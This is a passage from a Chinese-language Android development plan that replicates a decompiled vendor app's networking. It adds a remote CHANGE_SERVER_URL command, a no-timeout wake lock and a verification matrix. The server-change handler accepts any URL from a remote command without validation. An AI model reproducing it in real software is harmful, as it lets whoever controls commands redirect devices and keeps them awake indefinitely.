        var newUrl = params["serverUrl"]?.toString() ?: ""
        if (newUrl.isEmpty()) {
            // 回退: 检查 data 子对象
            val data = params["data"]
            if (data is JSONObject) {
                newUrl = data.optString("serverUrl", "")
            }
        }
        if (newUrl.isEmpty()) {
            Log.w(TAG, "CHANGE_SERVER_URL 参数无效，serverUrl 为空")
            return
        }
        Log.i(TAG, "收到修改服务器地址命令: $newUrl")
        changeServerUrl(newUrl)
    }
```

在 `handleRemoteCommand` 中添加对此命令的分发（在现有 `force_register` 判断之后）：

```kotlin
    // 在 handleRemoteCommand 的 force_register 判断之后追加:
    if (commandName == "CHANGE_SERVER_URL") {
        handleChangeServerUrl(command.let { json ->
            val map = mutableMapOf<String, Any>()
            json.keys().forEach { key -> map[key] = json.get(key) }
            map
        })
        return
    }
```

---

## Task 5: DataSyncClient 补齐 WakeLock 获取

**Files:**
- Modify: `network/DataSyncClient.kt` (createWebSocketListener → onOpen)

**JADX 参考:** C1109qg listener（在 p000/ 下，未找到独立文件，但外部审计确认 WakeLock 在连接成功时 acquire）

- [ ] **Step 1: 在 onOpen 中获取 WakeLock**

修改 `createWebSocketListener` 的 `onOpen` 回调：

```kotlin
    override fun onOpen(webSocket: WebSocket, response: Response) {
        synchronized(lock) {
            if (connectTimestamp != timestamp) return
            isConnected = true
            isConnecting = false
            Log.i(TAG, "WebSocket connected")
            // JADX: C1109qg listener — acquire WakeLock on connection success
            // WakeLock tag: "app:SyncLock", PARTIAL_WAKE_LOCK, no timeout
            acquireWakeLock()
        }
        onConnectionChanged(true)
    }
```

- [ ] **Step 2: 添加 acquireWakeLock 方法**

```kotlin
    private fun acquireWakeLock() {
        try {
            if (wakeLock == null) {
                val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
                wakeLock = pm?.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "app:SyncLock"
                )?.apply {
                    setReferenceCounted(false)
                }
            }
            val wl = wakeLock
            if (wl != null && !wl.isHeld) {
                wl.acquire()
                Log.d(TAG, "WakeLock acquired")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to acquire WakeLock: ${e.message}")
        }
    }
```

---

## Task 6: 综合验证

- [ ] **Step 1: 确认文件清单**

检查以下文件已正确创建/修改：

| 文件 | 状态 |
|------|------|
| `network/CommandRequest.kt` | 新建 |
| `network/HttpManager.kt` | 新建 |
| `network/DataSyncClient.kt` | 修改（onCommandCallback + WakeLock acquire） |
| `service/modules/NetworkManager.kt` | 修改（httpManager 激活 + 7 个代理方法 + CHANGE_SERVER_URL） |
| `test/.../network/CommandRequestTest.kt` | 新建（6 个测试） |
| `test/.../network/HttpManagerTest.kt` | 新建（12 个测试） |
| `test/.../network/DataSyncClientTest.kt` | 修改（追加 2 个测试） |

- [ ] **Step 2: 检查编译兼容性**

手动确认：
1. `CommandRequest` 的 import 路径在 DataSyncClient 和 NetworkManager 中正确
2. HttpManager 的 suspend 函数调用方在 coroutine scope 中
3. DataSyncClient 的构造函数改动向后兼容（onCommandCallback 有默认值 null）
4. 现有测试中 DataSyncClient 的构造调用不需要修改（使用命名参数）

- [ ] **Step 3: 对齐矩阵验证**

| Vendor 功能 | 之前状态 | 改后状态 |
|---|---|---|
| HttpManager 7 endpoint | ❌ 未复刻 | ✅ 独立类 |
| HMAC 双 Header 认证 | ⚠️ 仅 WS | ✅ WS + HTTP |
| 重试 3次/1.5x/cap5s | ❌ | ✅ |
| 4xx 不重试 / 5xx 重试 | ❌ | ✅ |
| 命令分发结构化 | ⚠️ JSON 字符串 | ✅ CommandRequest |
| 命令 30s 超时 | ❌ | ⚠️ 调用方管理 |
| CHANGE_SERVER_URL | ❌ | ✅ |
| WakeLock acquire | ❌ | ✅ |

---

## 依赖关系

```
Task 1 (CommandRequest) ← Task 3 (DataSyncClient 改造) ← Task 4 (NetworkManager 集成)
Task 2 (HttpManager)    ← Task 4 (NetworkManager 集成)
Task 5 (WakeLock)       ← 独立
Task 6 (验证)           ← 全部完成后
```

并行可能：Task 1 + Task 2 可同时进行；Task 5 可在任何时间点做。
